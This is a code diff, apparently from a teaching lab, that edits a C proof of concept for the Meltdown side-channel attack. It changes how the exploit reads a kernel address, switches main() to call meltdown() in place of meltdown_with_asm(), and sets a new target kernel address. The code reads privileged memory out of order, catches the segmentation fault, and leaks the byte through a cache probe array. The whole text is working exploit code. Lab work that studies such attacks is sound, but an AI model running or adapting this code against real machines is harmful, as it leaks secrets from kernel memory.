@@ -76,8 +76,9 @@ void attackChannel_x86(){
 
 // Out of order execution
 int meltdown(unsigned long kernel_addr){
-    // int key = 95;
-    
+    //int key = 95;
+    //array[key*4096+DELTA] += 10;
+    //return 0;    
     // Cache the data to improve success
     int fd = open("/proc/my_secret_key", O_RDONLY);
     if(fd<0){
@@ -87,7 +88,8 @@ int meltdown(unsigned long kernel_addr){
     int ret = pread(fd, NULL, 0, 0);    //Data is cached
 
 
-    char data = *(char*) kernel_addr;   //Raises exception
+//    char data = *(char*) kernel_addr;   //Raises exception
+	int data = ((char*) kernel_addr)[0];
     array[data*4096+DELTA] += 10;
 }
 
@@ -108,12 +110,12 @@ void meltdown_with_asm(unsigned long kernel_addr){
     kernel_data = *(char*)kernel_addr;
     array[kernel_data*4096 + DELTA] +=10;
 }
-void catch_segv(){
+void catch_segv(){	
     siglongjmp(jbuf, 1);
 }
 
 int main(){
-    unsigned long kernel_addr = 0xfab3b024;
+    unsigned long kernel_addr = 0x000000000dccd71b;
     signal(SIGSEGV, catch_segv);
 
     int fd = open("/proc/my_secret_key", O_RDONLY);
@@ -125,8 +127,8 @@ int main(){
     
     if(sigsetjmp(jbuf, 1)==0)
     {
-        // meltdown(kernel_addr);
-        meltdown_with_asm(kernel_addr);
+        meltdown(kernel_addr);
+       // meltdown_with_asm(kernel_addr);
     }
     else{
         printf("Memory Access Violation\n");
